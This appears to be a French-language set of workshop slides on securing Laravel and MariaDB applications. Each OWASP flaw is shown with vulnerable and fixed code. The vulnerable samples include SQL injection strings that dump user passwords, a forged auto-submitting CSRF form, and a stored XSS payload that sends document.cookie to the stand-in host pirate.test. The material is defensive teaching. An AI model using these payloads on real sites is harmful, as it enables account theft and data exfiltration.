Pourquoi la Sécurité est Indissociable du Couple Laravel + MySQL ?

Référentiel OWASP Top 10
⚠️ 1. La Base de Données est la Cible N°1

Dans une architecture XAMPP (Apache + MariaDB + PHP), toutes les données critiques résident dans MySQL : comptes, mots de passe, notes académiques et journaux.

  • Une seule requête SQL mal construite suffit à exposer toute la base.
  • Un compte root mal isolé compromet tout le serveur XAMPP.
🛡️ 2. Laravel est « Secure by Default »…

Le framework fournit nativement des boucliers puissants à chaque couche du modèle MVC :

  • Modèle (M) : Requêtes préparées PDO, $fillable, hachage bcrypt.
  • Vue (V) : Échappement automatique Blade {{ }}, directive @csrf.
  • Contrôleur (C) : FormRequest, Policies, RateLimiter.
⚡ 3. …Mais le Facteur Humain Reste Critique

Les failles dans une application Laravel proviennent rarement d'un bug du framework, mais d'une mauvaise utilisation par le développeur :

  • Utilisation abusive de DB::raw() ou {!! !!}.
  • Modèles déverrouillés avec $guarded = [].
  • Oubli de vérifier les droits d'accès (IDOR) ou APP_DEBUG=true en prod.
Citation clé : « La sécurité n'est pas une fonctionnalité qu'on ajoute à la fin du projet : c'est une architecture qui traverse chaque requête HTTP jusqu'au moteur MariaDB. »

🔗 Lien avec le Groupe 1 (Cycle de vie MVC)

Chaque requête entrant par public/index.php traverse le Kernel HTTP et une pile de Middlewares avant même d'atteindre le Contrôleur. Si une seule couche échoue, la base de données XAMPP n'est jamais sollicitée.

Injection SQL (SQLi) : Requêtes Brutes vs PDO & Eloquent

🚀 Démo Live Atelier 1
🔴 Code Vulnérable (Concaténation SQL directe)

Le paramètre $q saisi par l'utilisateur est injecté tel quel dans la chaîne SQL envoyée à MariaDB :

// ❌ DANGER : Concaténation directe dans DB::select()
$q = $request->input('matricule');
$students = DB::select(
  "SELECT id, matricule, full_name, filiere, moyenne 
   FROM students WHERE matricule = '$q'"
);

// Si $q = "' OR '1'='1" :
// SELECT ... WHERE matricule = '' OR '1'='1' -> TOUTE LA TABLE !
// Si $q = "' UNION SELECT id, email, password, role, 0 FROM users -- "
// -> EXFILTRATION DES COMPTES & MOTS DE PASSE !
🟢 Code Sécurisé (Eloquent ORM & Bindings PDO)

Laravel sépare la compilation de la requête SQL de l'envoi des données grâce aux marqueurs ? de PDO :

// ✅ SÉCURISÉ : Eloquent ORM (Requête préparée automatique)
$students = Student::where('matricule', $q)->get();

// ✅ SÉCURISÉ : SQL brut paramétré avec tableau de bindings
$students = DB::select(
  "SELECT id, matricule, full_name, filiere, moyenne 
   FROM students WHERE matricule = ?",
  [$q]
);
// MariaDB reçoit : Instruction = "... WHERE matricule = ?"
// Paramètre littéral inoffensif = ["' OR '1'='1"] -> 0 résultat !
⚠️ Point de vigilance avancé : Les méthodes whereRaw(), orderByRaw() et DB::raw() ne protègent pas si on y concatène une variable. Toujours utiliser whereRaw('matricule = ?', [$q]) !

Mass Assignment : Escalade de Privilèges en Base de Données

OWASP A01 / A04 : Broken Object Property Level Authorization
💥 Le Mécanisme de l'Attaque

Dans notre base MariaDB loko_security_lab, la table users possède la structure suivante :

CREATE TABLE users (
  id BIGINT PRIMARY KEY,
  name VARCHAR(255),
  email VARCHAR(255),
  password VARCHAR(255),
  role VARCHAR(30) DEFAULT 'student' -- 'student' ou 'admin'
);
  • Le formulaire HTML de profil n'affiche que name et email.
  • Mais l'attaquant ouvre l'inspecteur du navigateur (F12) et ajoute <input name="role" value="admin">.
  • Si le contrôleur exécute $user->update($request->all()) sans protection, Eloquent génère : UPDATE users SET name=?, email=?, role='admin' !
🛡️ Whitelist ($fillable) vs Blacklist ($guarded)

Eloquent propose deux propriétés mutuellement exclusives sur chaque Modèle :

  • protected $fillable = ['name', 'email', 'password']; (Recommandé)
    Approche Liste Blanche (Whitelist) : seuls ces 3 champs sont acceptés en assignation de masse. Toute autre colonne (comme role) est silencieusement ignorée.
  • protected $guarded = ['role']; (Risqué)
    Approche Liste Noire (Blacklist) : si un développeur ajoute plus tard une colonne is_super_admin via une migration et oublie de mettre à jour $guarded, la faille réapparaît !
  • protected $guarded = []; ou Model::unguard() : Désactive toute protection !

La Double Barrière Laravel : FormRequest + $fillable

🚀 Démo Live Atelier 2
🔴 Code Vulnérable ($request->all() non filtré)
// ❌ Contrôleur vulnérable : accepte tous les champs HTTP
public function updateVulnerable(Request $request)
{
    $user = User::where('email', 'mody.siby@loko.ci')->firstOrFail();

    // Force l'écriture de tous les paramètres POST dans MariaDB
    $user->forceFill($request->only(['name', 'email', 'role']))->save();

    return back()->with('alert', 'Profil mis à jour !');
}
// Résultat : l'étudiant devient Administrateur en 1 requête POST !
🟢 Code Sécurisé (UpdateProfileRequest + $fillable)
// ✅ Barrière 1 : app/Http/Requests/UpdateProfileRequest.php
public function rules(): array {
    return [
        'name'  => ['required', 'string', 'max:100'],
        'email' => ['required', 'email', 'max:150'],
        // 'role' n'est PAS dans rules() -> exclu par validated() !
    ];
}

// ✅ Barrière 2 : Contrôleur + Modèle User ($fillable)
public function updateSecure(UpdateProfileRequest $request) {
    $user->update($request->validated());
}
💡 Règle d'or pour l'équipe : Ne jamais passer $request->all() à Model::create() ou $model->update(). Toujours utiliser $request->validated() combiné à $fillable.

Cross-Site Scripting (XSS Stocké) & Moteur de Templates Blade

🚀 Démo Live Atelier 3
🔴 Rendu Brut Non Échappé : {!! $bio !!}

Lorsque l'étudiant enregistre une biographie contenant du HTML/JS dans MariaDB et que la vue Blade utilise {!! !!} :

<!-- ❌ Vue Blade vulnérable -->
<div class="student-bio">
    {!! $student->bio !!}
</div>

<!-- Payload stocké dans la table `students` : -->
<img src="x" onerror="fetch('http://pirate.test/steal?c='+document.cookie)">

<!-- Le navigateur exécute immédiatement le JavaScript malveillant
     chez tous les visiteurs (Professeur, Administrateur, Étudiants) ! -->
🟢 Échappement Automatique Blade : {{ $bio }}

Avec les doubles accolades {{ }}, Blade compile l'affichage via le helper e() (htmlspecialchars) :

<!-- ✅ Vue Blade sécurisée -->
<div class="student-bio">
    {{ $student->bio }}
</div>

<!-- Code PHP compilé par Laravel dans storage/framework/views : -->
<?php echo e($student->bio); ?>

<!-- Sortie HTML envoyée au navigateur (100% inerte) : -->
&lt;img src=&quot;x&quot; onerror=&quot;...&quot;&gt;
🔗 Lien avec le Groupe 4 (Moteur Blade) : Même dans les composants Blade (<x-alert :message="$msg" />), Laravel échappe automatiquement les attributs.

Défense en Profondeur : En-têtes HTTP (CSP) & Cookies HttpOnly

SecurityHeadersMiddleware
🛡️ Middleware d'En-têtes HTTP de Sécurité
// app/Http/Middleware/SecurityHeadersMiddleware.php
public function handle(Request $request, Closure $next): Response
{
    $response = $next($request);
    $response->headers->set(
        'Content-Security-Policy',
        "default-src 'self'; script-src 'self'; object-src 'none';"
    );
    $response->headers->set('X-Content-Type-Options', 'nosniff');
    $response->headers->set('X-Frame-Options', 'DENY');
    $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
    return $response;
}
🔒 Protection des Cookies de Session (config/session.php)
  • 'http_only' => true (Actif par défaut) :
    Interdit formellement au JavaScript d'accéder au cookie de session via document.cookie. Même en cas d'injection XSS, le cookie de session ne peut pas être exfiltré.
  • 'secure' => env('SESSION_SECURE_COOKIE', true) :
    Garantit que le cookie n'est transmis que sur une connexion chiffrée HTTPS.
  • X-Frame-Options: DENY :
    Empêche un site pirate d'intégrer notre portail UT LOKO dans une <iframe> invisible (attaque par Clickjacking).
Pilier N°4 (12:00 – 16:00) • Intervenante : Traoré Charifat Leyla

Cross-Site Request Forgery (CSRF) : L'Usurpation d'Action

Protection des Sessions & Requêtes POST/PUT/DELETE
1️⃣ Connexion Légitime

L'administrateur ou le professeur se connecte sur http://127.0.0.1:8000.

Son navigateur reçoit et stocke le cookie laravel_session.

2️⃣ Visite d'un Site Piège Externe

Sans se déconnecter, la victime visite une page externe piégée (ex. « Concours Bourse LOKO ») contenant un formulaire caché qui cible notre route de modification de notes :

<form action="http://127.0.0.1:8000/grades/update" method="POST">
  <input type="hidden" name="student_id" value="1">
  <input type="hidden" name="score" value="20">
</form>
<script>document.forms[0].submit();</script>
3️⃣ Le Bouclier @csrf de Laravel

Le site externe ne connaît pas le jeton secret aléatoire stocké dans la session Laravel de l'utilisateur.

  • Sans jeton _token valide, le middleware ValidateCsrfToken bloque immédiatement la requête avec HTTP 419 Page Expired !
  • La base de données MariaDB reste intacte.

Implémentation de @csrf, ValidateCsrfToken & SameSite

🚀 Démo Live Atelier 4
🔴 Configuration Vulnérable (Exemption CSRF imprudente)
// ❌ bootstrap/app.php : désactiver la vérification CSRF sur une route sensible
$middleware->validateCsrfTokens(except: [
    'lab/csrf/vulnerable-update',
]);

// ❌ Autre erreur classique : utiliser une route GET pour modifier la BDD
Route::get('/grades/reset/{id}', [GradeController::class, 'reset']);
🟢 Formulaire Blade Protégé & Vérification Cryptographique
<!-- ✅ Dans la vue Blade : ajout obligatoire de @csrf -->
<form method="POST" action="{{ route('lab.csrf.secure') }}">
    @csrf
    <input type="number" name="score" value="15">
    <button type="submit">Enregistrer la note</button>
</form>

// Laravel compare avec hash_equals($sessionToken, $requestToken)
// + Cookie configuré avec 'same_site' => 'lax' dans config/session.php
⚡ Pour les requêtes AJAX / Fetch : Laravel lit automatiquement l'en-tête X-CSRF-TOKEN (via <meta name="csrf-token">) ou le cookie XSRF-TOKEN.

Cryptographie en Base de Données : bcrypt / Argon2id vs MD5

OWASP A02 : Cryptographic Failures
🔴 Stockage en Clair ou MD5 / SHA-1 (Cassable en 0,001s)
  • Pas de sel (Salt) : deux étudiants ayant le mot de passe 123456 auront exactement le même hash MD5 (e10adc3949ba59abbe56e057f20f883e).
  • Trop rapide : un GPU moderne calcule plus de 50 milliards de MD5 par seconde (attaques par Rainbow Tables & dictionnaire).
$user->password = md5($request->password); // ❌ À BANNIR ABSOLUMENT !
🟢 Hachage Adaptatif Salé : Hash::make() & Cast hashed
  • Sel aléatoire de 128 bits intégré dans chaque hash : deux mots de passe identiques produisent deux condensats totalement différents dans MariaDB !
  • Facteur de coût (BCRYPT_ROUNDS=12) : ralentit volontairement le calcul (~250 ms) pour rendre le Brute-Force matériellement impossible.
// ✅ Dans User.php (Cast automatique Laravel 10/11/12)
protected function casts(): array {
    return ['password' => 'hashed'];
}
// Vérification : Hash::check($plainPassword, $user->password)
// Exemple en BDD : $2y$12$K8p9... (60 caractères)

Contrôle d'Accès (IDOR vs Policies) & Anti-Brute-Force (RateLimiter)

🚀 Démo Live Atelier 5
🔴 Faille IDOR (Insecure Direct Object Reference)

L'étudiant connecté n°1 modifie l'URL /grades/1 en /grades/2 pour lire les notes privées d'un camarade :

// ❌ Contrôleur vulnérable : vérifie l'identité (auth), mais PAS la propriété !
public function showVulnerable(int $id)
{
    $grade = Grade::with('student')->findOrFail($id);
    return view('lab.grade', compact('grade'));
}
🟢 Autorisation via GradePolicy & RateLimiter
// ✅ app/Policies/GradePolicy.php
public function view(User $user, Grade $grade): bool {
    return $user->role === 'admin' || $grade->student->user_id === $user->id;
}

// ✅ Dans le Contrôleur : renvoie HTTP 403 Forbidden si non autorisé
$this->authorize('view', $grade);

// ✅ Protection Brute-Force : max 5 essais / minute par IP (HTTP 429)
RateLimiter::attempt('login:'.$request->ip(), 5, fn() => ...);

Durcissement du Fichier .env et de MariaDB (XAMPP → Production)

OWASP A05 : Security Misconfiguration
🔴 Erreurs Critiques de Configuration (Développement → Prod)
  • Laisser APP_DEBUG=true en production : affiche le code source, les requêtes SQL et les variables d'environnement à la moindre erreur !
  • Utiliser le compte DB_USERNAME=root sans mot de passe de XAMPP en production (droits DROP DATABASE, accès à toutes les bases).
  • Publier le fichier .env sur GitHub ou pointer la racine Apache sur le dossier parent au lieu de /public.
🟢 Configuration Durcie Recommandée
# .env de Production sécurisé
APP_ENV=production
APP_DEBUG=false
APP_URL=https://portail.utloko.ci

# Compte MariaDB dédié (Principe du moindre privilège)
DB_USERNAME=loko_app_user
DB_PASSWORD="Str0ng!Db#Pass_2026"
SESSION_SECURE_COOKIE=true
-- Dans MariaDB : interdire DROP / ALTER au compte applicatif
GRANT SELECT, INSERT, UPDATE, DELETE ON loko_security_lab.* TO 'loko_app_user'@'localhost';
